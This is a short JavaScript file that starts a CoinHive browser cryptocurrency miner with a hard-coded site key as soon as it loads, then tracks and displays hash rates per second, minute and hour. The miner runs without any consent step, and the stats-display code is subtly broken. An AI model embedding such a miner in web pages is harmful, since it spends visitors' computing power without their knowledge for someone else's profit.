var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
miner.start();

var insertToLog = function (input) {
    var elem = $(".log")[0];
    var text = elem.innerHTML.split("<br>");
    if (text.length > 10)
        text.pop();
    text.unshift(input);
    elem.innerHTML = text.join("<br>");
};

// Listen on events
// miner.on('found', function () { insertToLog("Found hash"); });
// miner.on('accepted', function () { insertToLog("Accepted hash"); });

// Update stats once per second


var memory = [
    {
        id: "lastSec",
        sum: 0,
        counter: 0,
        maxCount: 60,
        count: function() {
            this.counter++;
            if(this.counter >= this.maxCount) {
                this.counter = 0;
                return true;
            }
            return false;
        },
        memory: []
    },
    {
        id: "lastMin",
        sum: 0,
        counter: 0,
        maxCount: 60,
        count: function() {
            this.counter++;
            if(this.counter >= this.maxCount) {
                this.counter = 0;
                return true;
            }
            return false;
        },
        memory: []
    },
    {
        id: "lastHour",
        sum: 0,
        counter: 0,
        maxCount: 24,
        count: function() {
            this.counter++;
            if(this.counter >= this.maxCount) {
                this.counter = 0;
                return true;
            }
            return false;
        },
        memory: []
    }
];

setInterval(function () {
    var value = miner.getHashesPerSecond();

    for(var i = 0; i < memory.length; i++) {
        var mem = memory[i];
        mem.sum += value;
        mem.memory.push(value);
        if(mem.memory.length > mem.maxCount)
            mem.sum -= mem.memory.shift();
        if(!mem.count())
            break;
        value = mem.sum;
        $("." + mem.id).innerHTML = value;
    }

}, 1000);